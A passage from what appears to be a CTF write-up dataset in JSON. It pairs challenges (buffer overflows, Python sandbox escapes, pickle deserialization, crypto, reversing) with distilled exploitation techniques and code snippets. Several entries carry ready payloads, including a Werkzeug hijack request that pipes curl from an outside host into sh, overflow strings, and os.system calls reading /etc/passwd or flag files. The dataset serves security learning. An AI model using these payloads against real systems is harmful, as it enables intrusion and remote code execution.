            "In challenges involving signature forging with elliptic curve isogenies, if the implementation sets a deterministic random seed during certain operations (like signature verification), an attacker can exploit this determinism to predict or replicate parts of the signature process. This is particularly exploitable if caching optimizations are disabled, as it may force the application to deterministically generate points or other cryptographic parameters that should be unpredictable. Identifying such deterministic behaviors in cryptographic routines and the absence of caching can be crucial for forging signatures or bypassing cryptographic checks.",
            "For challenges involving complex cryptographic primitives like isogenies over elliptic curves, the approach to forge a signature without the private key may involve constructing an isogeny chain that satisfies the verification conditions. This might involve simulating part of the signature generation process to duplicate a commitment, and then utilizing mathematical constructs like ideals and isogenies to navigate through the structure of elliptic curves and forge a valid signature. This strategy relies on understanding the mathematical operations and constraints (such as the degree of isogenies) laid out in the challenge, and creatively constructing an isogeny path that can be accepted as valid by the verifier."
        ],
        "key": "```python\n# This ensures all random points are deterministically  \n# generated  \nif canonical:  \n    set_random_seed(0)  \n\n# Generate a random kernel  \n# of order T_prime  \nP, Q = torsion_basis(E0, T_prime)  \nx = randint(1, T_prime)  \n```"
    },
    {
        "name": "pwn intended 0x3",
        "write_up": "dataset/raw/pwn intended 0x3.md",
        "type": "pwn",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": -1,
        "max_score": 2000,
        "difficulty": -1,
        "knowledge": [
            "To exploit a buffer overflow vulnerability for executing specific functions within a binary, first determine the precise amount of data to send to fill up the initial buffer and then the precise bytes to overwrite the return pointer. This often includes filling the buffer, potentially adding padding for alignment, and then sending the function's entry point as the new return address. Example payload format: `b\"A\"*[buffer size + padding] + p64([function address])`.",
            "Tools like radare2 and pwntools are essential for analyzing binary files and crafting exploits, respectively. radare2 can be used to disassemble and debug binaries to understand their structure and identify vulnerabilities such as buffer overflows. pwntools can then be utilized to write exploit scripts that craft payloads and interact with the binary or service to exploit these vulnerabilities. Example usage includes `p.sendline(b\"A\" * (32 + 8) + p64(0x4011ce))` with pwntools, where `p64` is used to format the memory address into a 64-bit little-endian string."
        ],
        "key": "```c\n#include <stdio.h>\n\nvoid flag() {\n    // <redacted>, print the flag\n}\n\nint main() {\n    char s[32];\n    gets(s);\n    return 0;\n}\n```"
    },
    {
        "name": "Pwn sanity check",
        "write_up": "dataset/raw/Pwn sanity check.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When dealing with a buffer overflow vulnerability, and if the goal is to execute a function bypassing its parameter checks, one viable strategy is to calculate the exact offset to the function and then jump directly to an instruction after the checks. This requires understanding the binary's assembly, specifically identifying where parameter validations end. To execute this, first calculate the offset to fill the buffer and the base pointer (if necessary), then append the address where parameter checks are bypassed in the target function.",
            "For crafting an exploit script in Python using the `pwntools` library, the general steps include setting up the context (architecture and log level), identifying the vulnerable binary, and deciding to run locally or remotely. After reading initial output (if any) using functions like `readuntil`, calculate the buffer overflow offset. Then, direct the execution flow to the desired function or an instruction within it that bypasses checks or undesired operations. To interact with the binary, use `sendline` to send the payload and `interactive` or similar reading functions to engage with the process post-exploit.\n\nExample payload: `b'\\x41'*(ret_offset) + p64(win_function_shell)`"
        ],
        "key": "```C  \nvoid vuln(void)  \n{  \n char local_48 [60];  \n int local_c;  \n  \n puts(\"tell me a joke\");  \n fgets(local_48,0x100,stdin);  \n if (local_c == -0x21523f22) {  \n   puts(\"very good, here is a shell for you. \");  \n   shell();  \n }  \n else {  \n   puts(\"will this work?\");  \n }  \n return;  \n}\n```"
    },
    {
        "name": "pwn1",
        "write_up": "dataset/raw/pwn1.md",
        "type": "pwn",
        "competition": [
            "CCCamp/2019",
            "https://ctftime.org/event/854/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In scenarios dealing with buffer overflow vulnerabilities where the target binary lacks stack canaries and is not compiled with Position Independent Executable (PIE) protection, an attacker can directly overwrite the return address to redirect execution flow to a desired function within the binary. This can be particularly useful in pwn challenges to execute a function, like a 'win' function that spawns a shell. To exploit this, calculate the exact offset to the return address from the start of the buffer and craft a payload that fills the buffer and overwrites the return address with the address of the desired function.  \nExample payload: `python -c 'print(\"A\"*offset + \"\\x4a\\x12\\x40\\x00\\x00\\x00\\x00\\x00\")'` to overwrite the return address and execute the 'win' function.",
            "To effectively gain code execution or escalate privileges in a binary exploitation challenge, it might be necessary to interact with the spawned shell within the same payload or immediately follow up with commands to be executed by the shell. This usually requires crafting a payload that not only exploits the vulnerability to gain shell access but also sends commands to the shell before it terminates or the input stream is closed. For instance, appending system commands at the end of an exploit payload can cause these commands to be executed by the spawned shell, facilitating further control over the target system or binary.  \nExample payload: `echo -ne 'payload_herecat /etc/passwd'` where `payload_here` is replaced with the actual exploit code."
        ],
        "key": "```c\nvoid main(EVP_PKEY_CTX *param_1)  \n{  \n char local_48 [64];  \n  \n init(param_1);  \n puts(\"Would you like a flag?\");  \n fgets(local_48,0x50,stdin);  \n system(\"cat fake_flag.txt\");  \n return;  \n}  \n```\n\n```c\nvoid win(void)  \n{  \n system(\"/bin/sh\");  \n return;  \n}  \n```"
    },
    {
        "name": "pwnykey",
        "write_up": "dataset/raw/pwnykey.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "Disassembling custom binary formats can sometimes require creating a custom disassembler if existing ones do not correctly handle the bytecode, especially if dealing with uncommon or bespoke virtual machines. This can involve understanding and interpreting bytecode operations, variables, and control flow directly from the binary, adjusting for peculiarities such as jumps to middle of instructions, or custom encoding of immediates.",
            "Constructing or deconstructing keys for validation checks in software can often involve reverse engineering to determine the format and validation checks applied to the key. Depending on complexity, solutions can range from brute force approaches to using constraint solving with tools like Z3. Particularly, when checks involve arithmetic or logical operations on the key's components, setting up equations or constraints that reflect these operations can lead to uncovering valid keys."
        ],
        "key": "```python\ndef check_key_format(key):\n    if len(key) != 29:\n        raise ValueError(\"Invalid key\")\n    key_parts = key.split(\"-\")\n    if len(key_parts) != 5:\n        raise ValueError(\"Invalid key\")\n    for part in key_parts:\n        if len(part) != 5:\n            raise ValueError(\"Invalid key\")\n        if any(c not in \"0123456789ABCDFGHJKLMNPQRSTUWXYZ\" for c in part):\n            raise ValueError(\"Invalid key\")\n    return key_parts\n\ndef check1(vres1):\n    expected = [30, 10, 21, 29, 10]\n    if vres1 != expected:\n        raise ValueError(\"Invalid key\")\n\ndef check2(vres2):\n    if sum(vres2) != 134 or product(vres2) != 12534912000:\n        raise ValueError(\"Invalid key\")\n\ndef check3(vv3):\n    vv3_2 = 1337\n    d1 = 4294967295\n    for _ in range(420):\n        x = vv3.pop()\n        x = ((x >> 2) & d1) ^ x\n        x = ((x << 1) & d1) ^ x\n        x = (((vv3[0] << 4) ^ vv3[0]) & d1) ^ x\n        vv3_2 = (13371337 + vv3_2) & d1\n        vv3.insert(0, x)\n    results = [func13(vv3, vv3_2, d1) for _ in range(3)]\n    expected = [2897974129, -549922559, -387684011]\n    if results != expected:\n        raise ValueError(\"Invalid key\")\n\ndef func13(vv3, vv3_2, d1):\n    x = vv3.pop()\n    x = ((x >> 2) & d1) ^ x\n    x = ((x << 1) & d1) ^ x\n    x = (((vv3[0] << 4) ^ vv3[0]) & d1) ^ x\n    vv3_2 = (13371337 + vv3_2) & d1\n    vv3.insert(0, x)\n    return x + vv3_2\n```"
    },
    {
        "name": "Pwn_ babypwn",
        "write_up": "dataset/raw/Pwn_ babypwn.md",
        "type": "pwn",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities, especially in C programs that utilizes struct allocations, if there's a variable after the buffer that is checked for a specific value for further actions (like opening a flag), you can overflow the intended buffer and overwrite the adjacent variable or check condition value directly. This can be achieved by sending data larger than the allocated buffer but crafted in such a way that it precisely modifies the subsequent variable to meet a condition. In scenarios where the buffer size is 32 bytes and an integer check value is adjacent, sending 32 bytes of padding followed by the 4 bytes intended to overwrite the check value can trigger the conditional function to execute.\n\n    Sample Payload for above scenario:\n    ```\n    python -c 'print(\"A\"*32 + \"\\x41\\x41\\x41\\x41\")'\n    ```",
            "In programming challenges, particularly those involving reading from standard input to a fixed-size buffer, it's critical to pay attention to the amount of bytes read versus the buffer size defined. If the program reads more bytes into a buffer than its size (e.g., using `fgets` to read 64 bytes into a 32-byte buffer), it presents an opportunity for a buffer overflow attack. This vulnerability allows an attacker to potentially overwrite adjacent memory areas, leading to unauthorized behavior such as bypassing security checks or executing arbitrary code. This knowledge is universally applicable in identifying and exploiting buffer overflow vulnerabilities in similar scenarios.\n\n    No specific sample payload necessary beyond what's provided in point 1."
        ],
        "key": "```c\n#include <stdio.h>  \n#include <string.h>  \n#include <unistd.h>\n\nstruct __attribute__((__packed__)) data {  \n char buff[32];  \n int check;  \n};\n\nvoid ignore(void)  \n{  \n setvbuf(stdout, NULL, _IONBF, 0);  \n setvbuf(stdin, NULL, _IONBF, 0);  \n}\n\nvoid get_flag(void)  \n{  \n char flag[1024] = { 0 };  \n FILE *fp = fopen(\"flag.txt\", \"r\");  \n fgets(flag, 1023, fp);  \n printf(flag);  \n}\n\nint main(void)  \n{  \n struct data name;  \n ignore(); /* ignore this function */\n\n printf(\"What's your name?\\n\");  \n fgets(name.buff, 64, stdin);  \n sleep(2);  \n printf(\"%s nice to meet you!\\n\", name.buff);  \n sleep(2);  \n printf(\"Binary exploitation is the best!\\n\");  \n sleep(2);  \n printf(\"Memory unsafe languages rely on coders to not make mistakes.\\n\");  \n sleep(2);  \n printf(\"But I don't worry, I write perfect code :)\\n\");  \n sleep(2);\n\n if (name.check == 0x41414141) {  \n   get_flag();  \n }\n\n return 0;  \n}\n```"
    },
    {
        "name": "pycryptor v2",
        "write_up": "dataset/raw/pycryptor v2.md",
        "type": "crypto",
        "competition": [
            "Aero/2019",
            "https://ctftime.org/event/772/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with custom encryption schemes that involve known headers (such as file formats like jpg), one approach to recover encryption keys is by using known plaintext attacks. If certain bytes of the plaintext are known (e.g., file headers), you can attempt to brute-force the remaining unknown bytes to recover the key. This method is applicable in scenarios where the encryption algorithm uses XOR operations, allowing the plaintext, key, and ciphertext to be manipulated algebraically. Specifically, for an encryption scheme that encrypts data in blocks, if the header of the plaintext is partially known, the remaining bytes can be brute-forced to reveal the key used for encryption.\n```python\nenc = read_file(\"example.enc\")  # Encrypted file\nfor tail in generate_tails():  # Function to generate possible tail values\n   jpg_header = (\"ffd8ffe000104a464946000101\" + tail).decode(\"hex\")\n   key = decrypt_key(jpg_header, enc[:16])  # Function to XOR known plaintext with ciphertext\n   if all(x in hexdigits for x in key):  # hexdigits checks if the result is a valid hexadecimal string\n       print(\"Key:\", key)\n       print(\"Tail:\", tail)\n```",
            "To decrypt data encrypted with custom algorithms that utilize CRC (Cyclic Redundancy Check) calculations for generating encryption keys or gammas, you can precalculate all possible gammas based on the limited range of CRC outputs. This is particularly useful if the CRC function outputs are significantly smaller than the potential input space, as in cases where the CRC output is a 2-byte value used in further cryptographic operations. By iterating over possible CRC outputs to generate gammas, one can match these against encrypted data to identify potential decryption keys or directly decrypt data.\n```python\ndef generate_gammas(key):\n   for x in range(0x80):  \n       for y in range(0x80):  \n           gamma = ''  \n           block_crc = [x, y]\n           for i in range(16):  \n               val = block_crc[i % 2]  \n               val ^= ord(key[i])  \n               val &= 0xff  \n               gamma += chr(val)\n           crcs = set(map(p_16, {(_x << 8 | _y), (_x << 8 | (_y | 1)), ((_x | 1) << 8 | _y), ((_x | 1) << 8 | (_y | 1))}))\n           yield gamma, crcs\n# KEY is the discovered key from the decryption process\ngammas = list(generate_gammas(KEY))\n```\nThis method facilitates identifying correct decryption parameters by matching the calculated CRC values of decrypted data against precomputed gamma CRC sets, thus narrowing down the correct decryption gamma for each block of data."
        ],
        "key": "```python  \ndef getGamma(self, block):  \n   gamma = ''\n\n   block_crc = p_16(Crc()(block)) # 2 bytes\n\n   for i in range(16):  \n       val = ord(block_crc[i%2])  \n       val >>= 1  \n       val ^= ord(self.m_key.getKey()[i])  \n       val &= 0xff\n\n       gamma += chr(val)\n\n   return gamma  \n```  \n\n```python  \nenc_subblock = xor_bytes(subblcok, gamma)  \n```  \n\n```  \nenc_block = enc_subblock_1 || enc_subblock_2 || p_16(crc(block))  \n```\n"
    },
    {
        "name": "pydis2ctf",
        "write_up": "dataset/raw/pydis2ctf.md",
        "type": "reverse",
        "competition": [
            "csictf/2020",
            "https://ctftime.org/event/1081/tasks/"
        ],
        "score": 490,
        "max_score": 2000,
        "difficulty": 0.245,
        "knowledge": [
            "When dealing with CTF challenges categorized under reversing, especially those involving Python bytecode, leveraging the Python `dis` module documentation is crucial for understanding the bytecode instructions and thereby reversing the bytecode to its original Python script form. This approach is applicable in scenarios where Python bytecode needs to be decompiled or understood to reverse-engineer the logic implemented by the original Python script.",
            "In the context of reversing challenges that involve encoding and manipulation of text data, understanding the logic of character manipulation based on ASCII values is fundamental. Specifically, if a script iterates over a text, performs operations based on the ASCII value of each character (`ord` function), and perhaps alters these based on the length of the text or a similar variable, reversing the operation typically involves inverting the mathematical operation applied. For example, if the original script encodes text by multiplying the ASCII value by 2 and then subtracting the length of the text, the reversing process should add the length back and then divide by 2, applying the `chr` function to convert ASCII back to characters. This knowledge is directly applicable in scenarios where encoded or ciphered text must be decoded, and the encoding process involves arithmetic operations on the ASCII values of the text characters.\n\nSample solution snippet to reverse the encoding process:\n```python\nencoded_text = 'YourEncodedTextHere'\ndecoded_text = ''  \nfor i in list(encoded_text):  \n    decoded_text += chr((ord(i) + len(encoded_text)) // 2)  \nprint(decoded_text)\n```"
        ],
        "key": "```python\nret_text = ''\n\nfor i in text:  \n    counter = text.count(i)  \n    ret_text += chr((2 * ord(i)) - len(text))\n```"
    },
    {
        "name": "pysandbox",
        "write_up": "dataset/raw/pysandbox.md",
        "type": "misc",
        "competition": [
            "SCTF/2020",
            "https://ctftime.org/event/1068/tasks/"
        ],
        "score": 377,
        "max_score": 1000,
        "difficulty": 0.377,
        "knowledge": [
            "In a sandbox escape challenge focusing on Python environments, specifically ones using the `ast` module for input parsing, explore areas of the abstract syntax tree (AST) not checked by the sanitizer. For instance, leveraging unchecked parts of AST nodes like `args` in `Lambda` or `generators` in `ListComp` allows bypassing restrictions on expressions. This method can be applied when calls or attributes are disallowed but the application fails to properly validate all components of complex AST node types.  \nExample payloads for retrieving files, such as a flag file:  \n   - List Comprehensions: `[e for e in list(open('flag'))]`\n   - Subscript: `[][sys.stdout.write(open('flag').read())]`",
            "In challenges where manipulating application behavior without direct code execution or imports is required, find a way to hijack or modify function behaviors to achieve remote code execution (RCE) or file read. This can be done by dynamically changing the handling of certain functions or objects\u2014for example, modifying the behavior of a well-known function to execute arbitrary code by crafting payloads that exploit externally controllable variables and bypass syntactical restrictions (such as lack of spaces or quotes). This strategy is particularly effective when direct function calls, imports, or conventional execution methods are filtered or blocked.  \nExample payload for RCE by function hijacking and external variables control:  \n   - First request (Function Hijack to convert `url_parse` to `eval`):   \n     ```\n     POST / HTTP/1.1  \n     Host: __loader__  \n     Content-MD5: _bootstrap_external  \n     Content-Encoding: werkzeug.urls  \n     Content-Length: 246  \n     cmd=request.__class__._get_current_object.__globals__[request.host].__class__.__weakref__.__objclass__.contents.__globals__[request.host].exec_module.__globals__[request.content_md5]._bootstrap.sys.modules[request.content_encoding].url_parse=eval  \n     ```\n   - Second request (Invoke Hijacked Function):  \n     ```\n     POST __import__('os').system('curl${IFS}https://shell.now.sh/8.8.8.8:1003|sh')  \n     Host: __loader__  \n     Content-MD5: _bootstrap_external  \n     Content-Encoding: werkzeug.urls  \n     ```"
        ],
        "key": "```python\nattributes = {  \n    'BoolOp': ['values'],  \n    'BinOp': ['left', 'right'],  \n    'UnaryOp': ['operand'],  \n    'Lambda': ['body'],  \n    'IfExp': ['test', 'body', 'orelse'],  \n    'Dict': ['keys', 'values'],  \n    'Set': ['elts'],  \n    'ListComp': ['elt', 'generators'],  \n    'SetComp': ['elt', 'generators'],  \n    'DictComp': ['key', 'value', 'generators'],  \n    'GeneratorExp': ['elt', 'generators'],  \n    'Yield': ['value'],  \n    'Compare': ['left', 'comparators'],  \n    'Call': False, # call is not permitted  \n    'Repr': ['value'],  \n    'Num': True,  \n    'Str': True,  \n    'Attribute': False, # attribute is also not permitted  \n    'Subscript': ['value'],  \n    'Name': True,  \n    'List': ['elts'],  \n    'Tuple': ['elts'],  \n    'Expr': ['value'], # root node  \n    'comprehension': ['target', 'iter', 'ifs'],  \n}\n```"
    },
    {
        "name": "pyshv1",
        "write_up": "dataset/raw/pyshv1.md",
        "type": "The type of the challenge described in the write-up is a **crypto** challenge.",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 572,
        "max_score": 1000,
        "difficulty": 0.572,
        "knowledge": [
            "When exploiting pickle deserialization vulnerabilities in a restricted environment where only certain modules are on the whitelist, utilize the `__reduce__` method to execute arbitrary code. This method should craft objects that, once unpickled, execute functions available within the whitelisted modules, allowing for the bypassing of imposed restrictions. This approach can facilitate the execution of commands or arbitrary code through whitelisted modules by manipulating the deserialization process to call desired functionalities indirectly. \n   \n   Example payload for adding \"os\" to the whitelist and running a command: \n   ```python\n   c1 = craft(\n       attr(\"sys.__setattr__\"), \n       \"modules\", {\"sys\": sysattr(\"modules\")}\n   )\n   c2 = craft(attr(\"sys.__getitem__\"), \"securePickle\", dict={\"whitelist\": [\"sys\", \"os\"]})\n   c3 = craft(attr(\"os.system\"), \"id; cat ../flag.txt\")\n   ```",
            "In scenarios where the available modules do not directly provide the desired level of access or functionality (like executing system commands), one can manipulate module attributes or the global namespace to introduce or modify functionalities. By altering `__builtins__` or similar globally accessible objects, it's possible to redefine key functionalities like Python's `__import__` mechanism. This can allow for the arbitrary execution of code via indirect access to non-whitelisted modules or functions, effectively bypassing the restrictions.\n\n   Example payload for redefining `__import__` and executing arbitrary code:\n   ```python\n   c1 = craft(attr(\"structs.__setattr__\"), \"structs\", attr(\"structs.__dict__\"))\n   c2 = craft(\n       attr(\"structs.__getattribute__\"),\n       \"__builtins__\",\n       items=[(\"__import__\", attr(\"structs.__getattribute__\"))]\n   )\n   c3 = craft(attr(\"structs.update\"), bs)\n   c4 = craft(attr(\"structs.__setitem__\"), \"structs\", ev)\n   c5 = craft(attr(\"structs.__call__\"), r'print(open(\"../flag.txt\").read())')\n   ```"
        ],
        "key": "```python\n# File: securePickle.py\n\nimport pickle, io\n\nwhitelist = []\n\n# See https://docs.python.org/3.7/library/pickle.html#restricting-globals  \nclass RestrictedUnpickler(pickle.Unpickler):  \n   def find_class(self, module, name):  \n       if module not in whitelist or '.' in name:  \n           raise KeyError('The pickle is spoilt :(')  \n       return pickle.Unpickler.find_class(self, module, name)\n\ndef loads(s):  \n   \"\"\"Helper function analogous to pickle.loads().\"\"\"  \n   return RestrictedUnpickler(io.BytesIO(s)).load()\n\ndumps = pickle.dumps  \n```\n\n```python\n# File: server.py\n\nimport securePickle as pickle  \nimport codecs\n\npickle.whitelist.append('sys')\n\nclass Pysh(object):  \n   def __init__(self):  \n       self.login()  \n       self.cmds = {}\n\n   def login(self):  \n       user = input().encode('ascii')  \n       user = codecs.decode(user, 'base64')  \n       user = pickle.loads(user)  \n       raise NotImplementedError(\"Not Implemented QAQ\")\n\n   def run(self):  \n       while True:  \n           req = input('$ ')  \n           func = self.cmds.get(req, None)  \n           if func is None:  \n               print('pysh: ' + req + ': command not found')  \n           else:  \n               func()\n\nif __name__ == '__main__':  \n   pysh = Pysh()  \n   pysh.run()  \n```\n\n```python\nclass RestrictedUnpickler(pickle.Unpickler):  \n   def find_class(self, module, name):  \n       if module not in whitelist or '.' in name:  \n           raise KeyError('The pickle is spoilt :(')  \n       module = __import__(module)  \n       return getattr(module, name)  \n```\n\n```python\npickle.whitelist.append('structs')  \n```"
    },
    {
        "name": "Python Shell",
        "write_up": "dataset/raw/Python Shell.md",
        "type": "misc",
        "competition": [
            "UTCTF/2021",
            "https://ctftime.org/event/1177/tasks/"
        ],
        "score": 943,
        "max_score": 1000,
        "difficulty": 0.943,
        "knowledge": [
            "When dealing with Python sandbox environments that restrict certain keywords to prevent exploitation, one can bypass these restrictions by dynamically accessing Python's built-in methods or attributes. This can be done via `__builtins__.__dict__` method, allowing the construction of prohibited keywords as strings. For example, to bypass the restriction on the `eval` function, use `__builtins__.__dict__['ev' + 'al']`.",
            "If direct function calls like `open()` are not permitted due to a sandbox restriction, alternative methods such as executing shell commands can be utilized to interact with the file system or perform actions indirectly. This can be achieved by accessing Python's `os` module dynamically and using its `system` method to run shell commands like `cat` to read files. This approach leverages the fact that while direct function calls might be filtered or restricted, the sandbox may not restrict indirect access to functionality via the Python environment's built-in modules or through external command execution. Example payload: `p = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '\"os\").system' + int.__doc__[3] + '\"cat /flag.txt\")'; __builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']; print(p)\"`."
        ],
        "key": "```python\np = '__builtins__.__i' + 'mport__' + int.__doc__[3] + '\"os\").system' + int.__doc__[3] + '\"cat /flag.txt\")'\n__builtins__.__dict__['print'] = __builtins__.__dict__['ev' + 'al']\nprint(p)\n```"
    },
    {
        "name": "pythopia",
        "write_up": "dataset/raw/pythopia.md",
        "type": "reverse",
        "competition": [
            "nullconHackIM/2023-Berlin",
            "https://ctftime.org/event/1900/tasks/"
        ],
        "score": 53,
        "max_score": 482,
        "difficulty": 0.10995850622406639,
        "knowledge": [
            "In Python abstract syntax tree (AST) parsing challenges, when given a comparison of string length, followed by splitting that string into multiple parts, each part might have to adhere to a specific condition. In this scenario, understanding how the input splits and analyzing conditions for each part can reveal what each segment must contain for the input to pass the checks.",
            "XOR encryption can frequently be reversed in CTF challenges if the XOR key and the ciphertext (or expected result of the XOR operation) are known. This is done by XORing the ciphertext (or expected result) with the XOR key to retrieve the original plaintext. In challenges involving a list of values being XORed with a known value, the reverse operation can be applied to each element to discover the required input. Example payload for reversing XOR when the key is 19 and the value is 36 would be: `chr(36 ^ 19)`."
        ],
        "key": "```python\ndef check_key(key):\n    if len(key) != 64:\n        return False\n\n    key1 = key[:16]\n    key2 = key[16:32]\n    key3 = key[32:48]\n    key4 = key[48:]\n\n    if key4 != 'you_solved_it!!}':\n        return False\n\n    if key1 != 'ENO{L13333333333':\n        return False\n\n    vals = [36, 76, ... , 120]  # truncated for brevity\n    for i, k in enumerate(key2):\n        v = ord(k) ^ 19\n        if v != vals[i]:\n            return False\n\n    if key3[::-1] != '_!ftcnocllunlol_':\n        return False\n\n    return True\n```"
    },
    {
        "name": "P_rn Protocol",
        "write_up": "dataset/raw/P_rn Protocol.md",
        "type": "pwn",
        "competition": [
            "Hack.lu/2020",
            "https://ctftime.org/event/1142/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In a custom protocol interaction challenge, ensure sequence numbers are incremented with each request, and maintain the same identifier throughout the session to keep track of the communication state with the server. This practice helps to avoid errors related to unexpected payloads or invalid message identifiers, which are common challenges when interacting with server applications that rely on a stateful protocol. Incrementing sequence numbers and reusing identifiers demonstrate the importance of maintaining state consistency between the client and server.",
            "When handling custom protocol interactions involving login procedures, it is crucial to first acquire or generate valid credentials before sending a login request. This can be accomplished through interacting with the server's protocol commands that allow for user registration or credential retrieval. Once obtained, sending the credentials following the server\u2019s expected format, often including a specific order or structure of packets, enables successful authentication. Ensuring correct format and sequence in login requests is essential for bypassing authentication mechanisms in services with custom protocols.\n   \n   Example payload for sending a login request (assuming obtained credentials):\n   ```python\n   # Assuming seq_num and identifier have been appropriately set\n   username = \"acquired_username\"\n   password = \"acquired_password\"\n   # Constructing and sending packets for login\n   pkt1 = Packet(b'\\x02\\x01' + seq_num)  # Message ID packet with incremented sequence number\n   pkt2 = Packet(b'\\x11\\x02' + identifier)  # Identifier packet\n   pkt3 = Packet(b'\\x02\\x04\\x01')  # Login request packet\n   # Send the packets as bytes\n   io.send(pkt1.to_bytes() + pkt2.to_bytes() + pkt3.to_bytes())\n   # Following up with username and password as the server prompts\n   io.sendline(username)\n   io.sendline(password)\n   ```"
        ],
        "key": "```python\ndef get_packets(io):  \n   while io.can_recv(timeout=1):  \n       # Get length  \n       length = ord(io.recvn(1))  \n       pkt_data = io.recvn(length)  \n       log.debug(\"Received (raw): {}\".format(binascii.hexlify(bytes([length])+pkt_data)))  \n  \n       yield Packet(bytes([length]) + pkt_data)  \n\ndef login(io, seq_num, identifier, username, password):  \n   \"\"\"  \n   Code Server Code Client Definition  \n   -           0x01        Login request by client.  \n   0x02        -           Successfull Login.  \n   \"\"\"\n\n   # Message ID  \n   pkt1 = Packet(b'\\x02\\x01'+seq_num)  \n   # Identifier  \n   pkt2 = Packet(b'\\x11\\x02'+identifier)  \n   # Login  \n   pkt3 = Packet(b'\\x02\\x04\\x01')  \n  \nlog.info(f\"Sending login request: {pkt1} {pkt2} {pkt3}\")  \n   io.send(pkt1.to_bytes() + pkt2.to_bytes() + pkt3.to_bytes())\n\n   io.recvuntil(\"Username: \")  \n   io.sendline(username)  \n   io.recvuntil(\"Password: \")  \n   io.sendline(password)\n\n   for pkt in get_packets(io):  \n       if pkt.type == 1:  \n           seq = pkt.data  \n       elif pkt.type == 4:  \n           if int(pkt.data[0]) == 2:  \n               log.success(\"Login successful!\")  \n   return seq\n```"
    },
    {
        "name": "Quack the quackers",
        "write_up": "dataset/raw/Quack the quackers.md",
        "type": "reverse",
        "competition": [
            "HackTM/2020/Quals",
            "https://ctftime.org/event/956/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "When reverse-engineering firmware, particularly for devices like the Digispark, identifying string patterns and recognizing references to firmware-specific libraries or functions can lead to the discovery of embedded instructions or scripts. This process can be facilitated by tools like Ghidra for analyzing the binary and scripts for interpreting custom virtual machine code contained within the firmware. An example of this approach is identifying and decoding instruction sets such as 'Q', 'U', 'A', 'C', 'K', and '!' to understand the malware's behavior, such as executing specific keystrokes or commands.",
            "For exploiting vulnerabilities similar to the heartbleed bug in a command and control (CnC) server, crafting a custom packet that triggers improper handling of memory can lead to the server disclosing sensitive information. Sending a specific packet size with no data and then closing the sending end of the socket can force the server to reply with data that has not been initialized or cleared. This method requires knowledge of the network protocol used by the malware and can reveal secrets or flags stored in memory. \n   - Example vulnerability exploitation snippet: \n     ```\n     $ ./heartbleed.php | xxd\n     ```\n   This snippet implies using a custom script (heartbleed.php) that sends a malformed packet to exploit a memory leak in the server\u2019s response handling."
        ],
        "key": "```c\nvoid execute_instruction(char instruction) {\n    switch (instruction) {\n        case 'U':\n            Y++; // Increment accumulator\n            break;\n        case 'K':\n            Y--; // Decrement accumulator\n            break;\n        case 'A':\n            Y *= Y; // Square the accumulator\n            break;\n        case 'C':\n            send_keystroke(Y); // Send keystroke based on accumulator\n            break;\n        case 'Q':\n            setup(); // Setup function\n            break;\n        case '!':\n            finalize(); // Finalize function\n            break;\n        default:\n            // Handle unknown instruction\n            break;\n    }\n}\n```"
    },
    {
        "name": "quantum 1",
        "write_up": "dataset/raw/quantum 1.md",
        "type": "This is a \"crypto\" challenge.",
        "competition": [
            "DiceCTF/2021",
            "https://ctftime.org/event/1236/tasks/"
        ],
        "score": 436,
        "max_score": 500,
        "difficulty": 0.872,
        "knowledge": [
            "When analyzing quantum circuits, especially those implementing Shor's algorithm for factoring public moduli, one strategy is to look for hard-coded values that depend on the modulus `N`. These values are often found in the implementation of modular exponentiation, which itself is made up of repeated modular multiplications and additions. In this context, understanding how modular operations are broken down into quantum implementations can reveal hardcoded values that can then be used to recover `N`. This approach leverages the structured, repetitive nature of the circuit to identify patterns or specific operations (e.g., the `ccx` instruction usage for conditional writes) that ultimately depend on `N`.",
            "For dynamic analysis of quantum circuits, especially when the challenge involves simulating a circuit to understand how data flows through it, exploiting the initialization phase where specific values are loaded can be crucial. Given Shor's algorithm involves steps like modular exponentiation by repeated squaring, early stage values such as `a, a^2, a^4, a^8, ... mod N` are loaded and can be paused during emulation to recover these modular powers. This is foundational for applying mathematical techniques like the greatest common divisor (gcd) to find a small multiple of `N`, leveraging the mathematical property that `a^2 - (a^2 mod N)` is a multiple of `N`. This technique requires familiarity with classical reversible computing gates like SWAP, NOT, CNOT, and CCNOT, understanding their function can aid in the emulation and analysis of quantum circuits designed for integer factorization.\n\nExample application based on point 2:\n```python\n# Assuming you've extracted a^2 mod N and a^4 mod N from the emulated circuit's operations\na2_mod_N = extracted_value1\na4_mod_N = extracted_value2\n\n# Calculated `a` values before modular reduction (must be inferred or known from circuit's function)\na2 = known_a_squared\na4 = known_a_to_the_fourth\n\n# Recovering a small multiple of `N`\nN_multiple = gcd(a2 - a2_mod_N, a4 - a4_mod_N)\n\n# This `N_multiple` can then be factored to attempt to recover `N` itself, if `N_multiple` is not prime.\n```"
        ],
